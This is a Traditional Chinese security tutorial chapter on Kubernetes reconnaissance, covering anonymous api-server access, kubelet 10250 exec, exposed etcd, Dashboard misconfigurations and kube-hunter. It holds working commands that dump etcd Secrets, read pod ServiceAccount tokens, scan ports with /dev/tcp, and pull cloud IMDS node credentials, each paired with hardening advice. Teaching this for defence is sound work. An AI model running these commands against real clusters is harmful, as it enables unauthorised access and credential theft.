# Ch 25 — K8s 偵察與暴露面：anonymous API / kubelet / etcd

> **目標**：掌握攻擊者進入 K8s 環境後的完整偵察路徑——從外部掃描到拿下一個 Pod 之後的內部枚舉，建立清楚的暴露面地圖。
>
> **環境**：minikube 1.33+ / kind；kube-hunter 可在外部或 Pod 內執行（`pip install kube-hunter`）；需要 kubectl 存取 cluster。

---

## 為什麼需要這一章

Ch 24 結尾說了一件事：K8s 扁平網路讓 Pod 之間沒有預設邊界，Secret 的 base64 保護形同虛設。那是防守視角。

從這章開始，我們切換成攻擊視角。

攻擊者進入一個 K8s 環境——無論是從外部掃到暴露的 API、還是靠社工或 CVE 拿下一個 Pod——第一步不是馬上打橫向，而是**偵察（Reconnaissance）**：搞清楚現在站在哪裡、能看到什麼、能存取什麼。

這一章把偵察路徑系統化。兩個視角：

- **外部視角**：cluster 外的攻擊者，只有 IP 位址，靠掃描找入口。
- **內部視角**：已經在某個 Pod 裡，靠 SA token 和 DNS 往外探。

---

**重要法律聲明**：本章所有偵察技術只能在自己擁有或明確授權的環境執行。對他人環境未授權偵察在多數國家構成刑事犯罪，台灣《電腦處理個人資料保護法》及《刑法》第 358-360 條均有相應規定。

---

## 先建直覺

```
外部視角                             內部視角
（Internet / VPN → cluster）        （已在 Pod 內）

Attacker                             Compromised Pod
    │                                    │
    ├─ 6443  API Server ──────────────── ┼─ /var/run/secrets/.../token
    │    └─ /api, /version, /healthz     │      └─ curl $APISERVER with Bearer
    │    └─ anonymous: system:anonymous  │
    │                                    ├─ kubectl.default.svc (DNS)
    ├─ 10250 kubelet (authenticated)     │      └─ nslookup, /etc/resolv.conf
    │    └─ /pods, /exec, /metrics       │
    │    └─ anonymous-auth=true = 毀滅   ├─ 169.254.169.254 (cloud IMDS)
    │                                    │      └─ EKS/GKE/AKS node 的 credential
    ├─ 10255 kubelet (read-only HTTP)    │
    │    └─ 已廢棄，老 cluster 仍存在    └─ 10250 其他 node（扁平網路掃）
    │
    ├─ 2379  etcd
    │    └─ 存全部 K8s 物件含 Secret 明文
    │    └─ 正常：只 api-server 能連
    │    └─ 危險：綁 0.0.0.0 或無 TLS
    │
    └─ 8001/8443 K8s Dashboard
         └─ --enable-skip-login 或 cluster-admin SA
```

兩種視角的資訊量不對等：內部視角（在 Pod 裡）資訊更多、權限邊界更模糊，因為 SA token 和 DNS 已經幫你解決了認證和服務發現。外部視角靠的是設定錯誤——api-server 沒關 anonymous auth、kubelet 沒關 anonymous auth、etcd 沒綁 localhost。

---

## 外部偵察：從 cluster 外看到什麼

### 1. api-server 匿名存取

K8s api-server 預設啟用匿名認證（`--anonymous-auth=true`）。匿名請求會被指定一個固定身分：`system:anonymous`，所屬群組 `system:unauthenticated`。

K8s 把部分唯讀端點綁給 `system:public-info-viewer` 這個 ClusterRole，而這個 ClusterRole 預設已經 bind 給 `system:unauthenticated`。也就是說，不帶任何 token 的請求仍然能讀到以下端點：

```
/api
/api/v1
/apis
/version
/healthz
/livez
/readyz
/openapi/v2
```

探測方式：

```bash
# 最基本：確認 api-server 存活
curl -k https://<apiserver-ip>:6443/version

# 典型輸出（不需任何憑證）
{
  "major": "1",
  "minor": "29",
  "gitVersion": "v1.29.3",
  "platform": "linux/amd64"
  ...
}

# 嘗試列 namespace（需要 list namespace 權限，匿名通常沒有）
curl -k https://<apiserver-ip>:6443/api/v1/namespaces

# 如果匿名被授予了 list namespace（設定錯誤），回傳類似：
# {"kind":"NamespaceList","apiVersion":"v1","items":[...]}

# 如果沒有，回傳 403：
# {"kind":"Status","status":"Failure","message":"namespaces is forbidden: User \"system:anonymous\" ..."}
```

403 回傳本身就是資訊洩漏：確認 api-server 在這個位址、且 anonymous auth 是開的（如果 `--anonymous-auth=false`，會拿到 401 而不是 403，或是連線被拒）。

**關掉匿名存取**：

```yaml
# kube-apiserver 啟動參數（通常在 /etc/kubernetes/manifests/kube-apiserver.yaml）
- --anonymous-auth=false
```

關掉後，所有無憑證請求直接 401，不再有 `system:anonymous` 身分。代價是 `/healthz` 等 liveness probe 端點也會需要認證，要確認 kubelet 有設 `--anonymous-auth=false` 對應的存取憑證。

---

### 2. kubelet 10250 / 10255 未認證

kubelet 是跑在每個 Node 上的 daemon，負責管理該 Node 的 Pod。它自己也跑了一個 HTTPS API，預設在 **10250** 埠。

問題：kubelet 的 anonymous auth 和 api-server 一樣預設是開的（`--anonymous-auth=true`），而且 kubelet 的 RBAC 授權預設不做（需要額外設 `--authorization-mode=Webhook`）。老叢集或快速安裝的環境非常容易留下這個洞。

**10250 端點清單**（需要能連到 Node IP）：

```bash
NODE_IP=<node-ip>

# 列出這個 Node 上所有 Pod（含 Pod spec、container 名稱、namespace）
curl -sk https://$NODE_IP:10250/pods | python3 -m json.tool | head -100

# 執行指令（如果 anonymous auth 開著，等同於任意 exec）
# 以下指令在 container「nginx」裡跑 id
curl -sk https://$NODE_IP:10250/exec/<namespace>/<pod-name>/nginx \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"input":false,"output":true,"tty":false,"command":["id"]}'
# 這是 WebSocket 升級端點，直接 curl 不夠，需要 wscat 或 kubectl exec 底層的 SPDY

# metrics（無需認證）
curl -sk https://$NODE_IP:10250/metrics | head -30
```

`--anonymous-auth=true` 且無 Webhook 授權的 kubelet，任何人都能對 Node 上任意 Pod 執行指令。這是接近「毀滅性」的設定錯誤——不需要 kubectl、不需要 SA token，直接拿下節點上所有 Pod。

**10255 read-only HTTP port**（已在 K8s 1.16 廢棄）：

```bash
# 老 cluster（< 1.16 或手動保留設定）可能還跑著 10255
curl http://$NODE_IP:10255/pods
curl http://$NODE_IP:10255/healthz
```

10255 是明文 HTTP，沒有認證，只有唯讀能力。現代 cluster 應該確認 10255 沒有開。

**修補方式**：

```yaml
# kubelet 設定（/var/lib/kubelet/config.yaml）
authentication:
  anonymous:
    enabled: false          # 關掉匿名
  webhook:
    enabled: true           # 啟用 Webhook 模式（讓 api-server 做授權判定）
authorization:
  mode: Webhook             # 不是 AlwaysAllow
```

---

### 3. etcd 2379 暴露

etcd 是 K8s 的狀態資料庫（key-value store），存了所有 K8s 物件：Pod spec、Deployment、ConfigMap、**Secret**。

Secret 在 etcd 裡的格式：**預設不加密**，只是 base64 encode。Ch 24 說 Secret 是假安全，根源就在這裡——只要能讀 etcd，就能拿到所有 Secret 的明文。

正常情況下，etcd 只監聽 localhost，只有 api-server 用 TLS mutual auth（client cert + server cert）連接。但設定錯誤的環境可能：

- etcd 綁 `0.0.0.0:2379`（所有網路介面）
- 沒有 TLS，或 TLS 但不驗 client cert

探測方式：

```bash
# 用 etcdctl 連（需要先安裝 etcdctl，版本對應 etcd v3）
ETCDCTL_API=3 etcdctl \
  --endpoints=http://<etcd-ip>:2379 \
  get / --prefix --keys-only | head -20

# 如果有 TLS 但不驗 client：
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<etcd-ip>:2379 \
  --insecure-skip-tls-verify \
  get / --prefix --keys-only | head -20
```

一旦能連，讀 Secret：

```bash
# 讀 default namespace 下的 my-secret
ETCDCTL_API=3 etcdctl \
  --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/default/my-secret

# 輸出是 protobuf + base64，直接 decode 可能有雜訊，
# 但 Secret value 會以可識別的 base64 字串出現
# 用 strings 過濾：
ETCDCTL_API=3 etcdctl \
  --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/default/my-secret | strings
```

etcd key 的命名規律：`/registry/<resource-type>/<namespace>/<name>`，例如：

```
/registry/pods/default/nginx-pod
/registry/secrets/kube-system/bootstrap-token-abc123
/registry/serviceaccounts/default/default
```

**本段未實測，為理論預期行為**。若要自架驗證，用 kind 建 cluster，再在 kind 的 control-plane container 裡用 `docker exec` 拿 etcdctl，或用 kube-goat 的 `etcd-exposed` 場景。

**防禦**：etcd 必須只監聽 localhost 或 cluster 內部網路，強制 mutual TLS，並開啟 api-server 端的 [Encryption at Rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)（EncryptionConfiguration）。

---

### 4. K8s Dashboard 無認證

K8s Dashboard 是官方 Web UI，部署在 cluster 內，透過 `kubectl proxy` 或 NodePort / Ingress 對外曝光。

Dashboard 本身預設需要認證（Bearer token 或 kubeconfig），但常見的錯誤部署：

1. **`--enable-skip-login`**：Dashboard 啟動參數加了這個旗標，登入頁出現「Skip」按鈕，點一下就進去，身分是 Dashboard 的 SA。
2. **SA 綁 cluster-admin**：Dashboard 的 ServiceAccount 被 ClusterRoleBinding 到 `cluster-admin`，進去等同拿到 cluster 全權。
3. **Ingress 無認證**：Dashboard 的 Ingress 沒有設 basic auth / OAuth，任何人能從外部打到 Dashboard。

偵測：

```bash
# 掃 port（需要知道 Node IP 或 LoadBalancer IP）
nmap -p 8001,8443,30000-32767 <node-ip>

# 如果找到 Dashboard port，直接用瀏覽器開，看有無登入頁或直接進去
# 也可用 curl 確認：
curl -k https://<node-ip>:<port>/

# kubectl proxy 方式（需要有 kubeconfig，攻擊者通常用 kubectl proxy 繞 TLS）
kubectl proxy --port=8001 &
curl http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

---

### 5. kube-hunter 自動化掃描

[kube-hunter](https://github.com/aquasecurity/kube-hunter) 是 Aqua Security 開源的 K8s 安全掃描工具，能自動偵測上面提到的所有暴露面。只在自己的環境或授權環境使用。

```bash
pip install kube-hunter

# 外部掃描模式：從 cluster 外打一個 IP
kube-hunter --remote <apiserver-ip>

# 網段掃描：自動 ping 掃描整個子網
kube-hunter --network 192.168.1.0/24

# Pod 內部掃描模式（從被拿下的 Pod 內執行）
kube-hunter --pod
```

輸出範例（簡化）：

```
+------------------+----------------------+----------------------+
| Location         | Category             | Details              |
+==================+======================+======================+
| 192.168.1.10     | Access Risk          | Anonymous Auth       |
| :6443            |                      | api-server anonymous |
|                  |                      | access enabled       |
+------------------+----------------------+----------------------+
| 192.168.1.10     | Remote Code Exec     | Kubelet RCE          |
| :10250           | HIGH                 | exec endpoint        |
|                  |                      | no auth required     |
+------------------+----------------------+----------------------+
```

欄位解讀：

- **Category**：`Access Risk`、`Remote Code Exec`、`Information Disclosure` 等
- **HIGH / LOW**：kube-hunter 自定義的嚴重度，HIGH 通常意味直接 RCE 或憑證外洩
- **Location**：找到問題的 IP:port

kube-hunter 只做偵測，不做攻擊。它的掃描結果本身就是一份暴露面報告，可以直接用來對照修補清單。

---

## 內部偵察：從 Pod 內部往外看

進入 Pod 之後，環境和裸機很像，但多了幾個 K8s 特有的資訊來源。

### 1. 讀 ServiceAccount token

Ch 23 講過 SA token 的掛載位置。Pod 啟動時，api-server 會把對應 SA 的 JWT token 掛進來：

```bash
# token：JWT，拿來打 api-server
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# namespace：這個 Pod 屬於哪個 namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# CA cert：驗證 api-server TLS 憑證用
ls /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 把三個值存起來，後面用
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

`kubernetes.default.svc` 是 K8s 自動建立的 Service DNS 名稱，永遠指向 api-server。不需要知道 api-server 的 IP，DNS 就會解析到正確位址。

---

### 2. 用 token 探 api-server

```bash
# 確認 api-server 能連、token 有效
curl -s $APISERVER/api \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT

# 列出目前 namespace 的 Pod
curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/pods \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT | python3 -m json.tool | grep '"name"' | head -20

# 列出目前 namespace 的 Secret（如果有 list secret 權限）
curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/secrets \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT | python3 -m json.tool

# 試著列所有 namespace（cross-namespace）
curl -s $APISERVER/api/v1/namespaces \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT
```

每個 curl 的 HTTP status code 很重要：

- 200：有權限，回傳資料
- 403：Forbidden——身分認證成功，但 RBAC 拒絕
- 401：Unauthorized——token 無效或過期

403 表示 api-server 認識你的 token，只是沒有該權限；你還是知道 token 有效、namespace 存在。

---

### 3. 枚舉自己的權限（can-i）

不知道 SA 有哪些權限？直接問 api-server。

```bash
# 如果 Pod 裡有 kubectl
kubectl auth can-i --list --token=$TOKEN --server=$APISERVER --certificate-authority=$CACERT

# 如果 Pod 裡沒有 kubectl，用 SelfSubjectRulesReview API
curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT \
  --header "Content-Type: application/json" \
  -X POST \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectRulesReview",
    "spec": {"namespace": "default"}
  }' | python3 -m json.tool
```

SelfSubjectRulesReview 回傳的 `status.resourceRules` 和 `status.nonResourceRules` 列出這個身分在指定 namespace 能做的所有動作，直接就是一份可利用的能力清單。Ch 26 會對這份清單做逐條分析。

---

### 4. DNS 枚舉 cluster 內的 Service

K8s 扁平網路加上 CoreDNS，讓 Service 發現變得極其簡單：

```bash
# 確認 cluster DNS
cat /etc/resolv.conf
# 輸出類似：
# nameserver 10.96.0.10        ← CoreDNS IP
# search default.svc.cluster.local svc.cluster.local cluster.local

# 解析已知服務
nslookup kubernetes.default.svc.cluster.local
# 或簡寫（因為 search domain）
nslookup kubernetes.default

# 嘗試解析其他 namespace 的服務（需要猜測名稱）
nslookup <service-name>.<namespace>.svc.cluster.local

# 如果有 dig
dig @10.96.0.10 kubernetes.default.svc.cluster.local
```

CoreDNS 沒有 zone transfer 保護，但也不支援 AXFR（不能一次拉出所有記錄）。枚舉只能靠：

1. 讀 api-server `/api/v1/services`（如果 SA 有權限）
2. 猜常見名稱（`mysql`、`redis`、`elasticsearch`、`prometheus`...）
3. 讀 Pod 的環境變數——K8s 會把同 namespace 的 Service 注入成 env var

```bash
# Pod 的環境變數裡會有同 namespace 所有 Service 的 IP 和 port
env | grep -i service
env | grep _SERVICE_HOST
env | grep _SERVICE_PORT
```

---

### 5. 掃描其他 Node 的 kubelet 10250

Ch 24 說扁平網路讓 Pod 能直接打 Node 的 IP。如果 kubelet 的 anonymous auth 沒關，從 Pod 內就能掃整個 cluster 的 Node：

```bash
# 先取得 Node IP 清單（需要 list nodes 權限）
curl -s $APISERVER/api/v1/nodes \
  --header "Authorization: Bearer $TOKEN" \
  --cacert $CACERT | python3 -m json.tool | grep '"address"' | head -20

# 對每個 Node IP 試打 kubelet
NODE_IP=<node-ip>
curl -sk https://$NODE_IP:10250/pods | python3 -m json.tool | grep '"name"'

# 掃 10250 是否開著（沒有 nmap 時用 bash）
for ip in 10.0.0.1 10.0.0.2 10.0.0.3; do
  timeout 1 bash -c "echo >/dev/tcp/$ip/10250" 2>/dev/null \
    && echo "$ip:10250 OPEN" \
    || echo "$ip:10250 closed"
done
```

**本段未實測，為理論預期行為**。驗證方式：用 kind 建三節點 cluster，在一個 Pod 裡執行上面的掃描，用 [kube-goat](https://github.com/madhuakula/kubernetes-goat) 的 `kubelet-exposed` 場景提供真實的 10250 回應。

---

### 6. Cloud metadata endpoint (IMDS)

在 EKS（AWS）、GKE（GCP）、AKS（Azure）等託管 K8s 上，每個 Node 都能打 cloud provider 的 Instance Metadata Service（IMDS）。這個 endpoint 是個 link-local 位址（`169.254.169.254`），Node 上的所有程序都能存取，包含 Pod。

```bash
# AWS EKS：取得 Node 的 IAM role 清單
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 輸出 role 名稱，例如 "eks-node-role"
# 再打一層拿臨時 credential
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role
# 回傳 JSON 含 AccessKeyId / SecretAccessKey / Token（有效期 1-6 小時）

# GKE：GCP Metadata Server
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# AKS：Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

拿到 cloud credential 後，攻擊路徑跳出 K8s：用 aws-cli / gcloud / az 接管 Node 的 cloud 身分，能做的事取決於 Node 的 IAM 角色設定。過度授權的 Node role 直接能讀 S3、操作其他 EC2、甚至存取同帳號的其他服務。

**防禦**：AWS 用 IMDSv2（需要 session token，Pod 直接打 v1 會 403）；GKE 用 Workload Identity；AKS 用 Workload Identity Federation。

**本段未實測，為理論預期行為**。驗證需要真實 EKS/GKE/AKS cluster 或對應的模擬環境（CloudGoat / Terragoat）。

---

## 對比取捨表

| 暴露面 | 條件 | 攻擊者能拿到什麼 | 風險等級 |
|---|---|---|---|
| api-server anonymous /version | 預設開 | K8s 版本、平台 | LOW（資訊洩漏） |
| api-server anonymous /api/v1/namespaces | 需要 list namespace 被賦予 anonymous | 所有 namespace 清單 | MEDIUM |
| kubelet 10250 + anonymous=true + 無 Webhook | 設定錯誤 | 對任意 Pod exec，等同拿下 Node | CRITICAL |
| kubelet 10255 (read-only) | 老 cluster 保留 | 所有 Pod 資訊（唯讀） | MEDIUM |
| etcd 2379 無 TLS / 綁 0.0.0.0 | 設定錯誤 | 所有 K8s 物件含 Secret 明文 | CRITICAL |
| K8s Dashboard + skip-login + cluster-admin | 設定錯誤 | cluster 全控 | CRITICAL |
| Pod 內 SA token（default SA） | 預設掛載 | 視 RBAC 而定，最少能探 api | LOW-HIGH |
| IMDS 169.254.169.254 | 在 cloud 上 + 無 IMDSv2 | Node 的 cloud credential | HIGH-CRITICAL |

---

## 踩雷集錦

**1. curl -k 不等於安全**

`-k` 跳過 TLS 驗證，只是讓你能連上去，不代表連線加密。在打 kubelet 10250 的時候，如果 kubelet 有自簽憑證，正確做法是帶 `--cacert /var/lib/kubelet/pki/kubelet-client-current.pem`，或者在已知安全網路內用 `-k`。把 `-k` 當成「安全的選項」是常見誤解。

**2. 403 不代表沒有資訊**

很多人看到 403 就停了。403 告訴你：api-server 在、anonymous auth 開、這個端點需要權限。接著測其他端點，往往能找到不需要任何權限的資訊。建立系統性的端點清單，逐一探測比亂猜有效。

**3. SA token 不是靜態的**

K8s 1.21 之後，SA token 預設用 Projected ServiceAccountToken，有效期預設 1 小時，kubelet 會自動更新。如果你 `cat` 了 token 存到某個地方，1 小時後那個 token 可能已經過期。打 api-server 要直接讀 `/var/run/secrets/kubernetes.io/serviceaccount/token` 而不是用存好的副本。

**4. kube-hunter 掃到 OPEN 不代表能打**

kube-hunter 判定 10250 有 anonymous RCE，但實際上那個端點的 `/exec` 是 SPDY / WebSocket 升級協定，直接 curl 拿不到 shell。需要用 `wscat`、`websocat` 或自己寫升級邏輯。看到 HIGH 發現就以為能直接 RCE 是工具用法的誤解，要手動驗證。

**5. cloud IMDS 的 169.254.169.254 在 K8s 環境不保證能打到**

某些 CNI 實作（特別是搭配 NetworkPolicy 的設定）會在 Pod 層阻斷對 link-local 位址的流量。另外 GKE Autopilot 預設封鎖 IMDS 存取。打 IMDS 之前先確認 `curl http://169.254.169.254` 有沒有 response，沒有的話不要浪費時間。

---

## 進階延伸

**kube-hunter 的主動模式**：kube-hunter 有 `--active` 旗標，會實際嘗試利用找到的漏洞（例如真的去執行 kubelet exec）。在授權的滲透測試中，這能快速確認是否真的可利用，但一定要先確認授權範圍。

**etcd 的 Encryption at Rest**：K8s 提供 `EncryptionConfiguration`，能讓 api-server 在寫入 etcd 時對 Secret 做 AES-GCM 或 secretbox 加密。開了之後，即使 etcd 被直接存取，讀到的也是密文。設定方式見 [官方文件](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)。

**Falco 偵測偵察行為**：從 Pod 內打 IMDS、讀 `/var/run/secrets/...` 之外的檔案、對 10250 發請求，都會觸發 Falco 的預設規則。Part 6 的防禦章節會深入 Falco 規則撰寫。

**RBAC 偵察的自動化**：[kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can) 和 [rbac-tool](https://github.com/alcideio/rbac-tool) 能自動枚舉哪些 SA / 角色有哪些敏感權限，是 Ch 26 提權分析的前置工具。

---

## 本章重點整理

- K8s 有兩條偵察路徑：**外部**（靠設定錯誤，掃 6443/10250/2379/8443）和**內部**（靠 SA token，從 Pod 往外探）。
- api-server 預設開 anonymous auth，匿名身分能讀 `/version`、`/healthz` 等端點，暴露 K8s 版本資訊。
- kubelet 10250 如果 `--anonymous-auth=true` 且無 Webhook 授權，能對任意 Pod 執行指令——這是最高危的設定錯誤之一。
- etcd 存 cluster 全部狀態含 Secret 明文，必須只讓 api-server 存取，並開啟 Encryption at Rest。
- 從 Pod 內部，SA token + `kubernetes.default.svc` + CA cert 三件套就能打 api-server，用 SelfSubjectRulesReview 枚舉自己的權限。
- Cloud 環境記得打 IMDS（`169.254.169.254`），Node 的 IAM credential 可能直接接管 cloud 資源。
- kube-hunter 是合法的偵察自動化工具，只在自己擁有或授權的環境使用。

---

## 自我檢核

1. K8s api-server 的 `--anonymous-auth=true` 預設讓匿名身分能存取哪些端點？為什麼 `/api/v1/namespaces` 通常需要額外授權才能被匿名存取？

2. kubelet 10250 的 `/exec` 端點為什麼不能直接用 curl 拿到 shell？需要哪種協定？

3. 從 Pod 內部打 api-server，`kubernetes.default.svc` 是怎麼被解析的？不知道 api-server IP 的情況下如何連上它？

4. SelfSubjectRulesReview 和 `kubectl auth can-i --list` 在語義上有什麼差別？各回傳什麼格式的資訊？

5. AWS EKS 上的 Pod 打 IMDS 拿到 credential 後，攻擊路徑接下來如何延伸到 cloud 資源？IMDSv2 如何阻斷這條路？

6. etcd 開啟 Encryption at Rest 後，攻擊者直接存取 etcd 還能拿到什麼資訊？哪些資訊不會被加密保護？

---

## 延伸閱讀

- [Kubernetes Security Best Practices — CIS Benchmark](https://www.cisecurity.org/benchmark/kubernetes)：涵蓋 api-server、kubelet、etcd 的所有設定項目，是本章防禦建議的上游來源。
- [kube-hunter GitHub](https://github.com/aquasecurity/kube-hunter)：原始碼裡列出了所有偵測的 Hunter 模組，比執行結果更能理解每個掃描項目的原理。
- [kubernetes-goat](https://github.com/madhuakula/kubernetes-goat)：刻意設計的有漏洞 K8s 環境，包含 SSRF-to-IMDS、kubelet-exposed、etcd-exposed 等場景，本章所有「未實測」段落都能在這裡驗證。
- [Aqua Security — attacker's view of kubernetes](https://www.aquasec.com/cloud-native-academy/kubernetes-101/kubernetes-attack-surface/)：整理外部攻擊面的視角，和本章外部偵察一節相互對照。

---

→ [Ch 26 — RBAC 提權：危險 verb 與 token 竊取](./26-k8s-rbac-privesc.md)
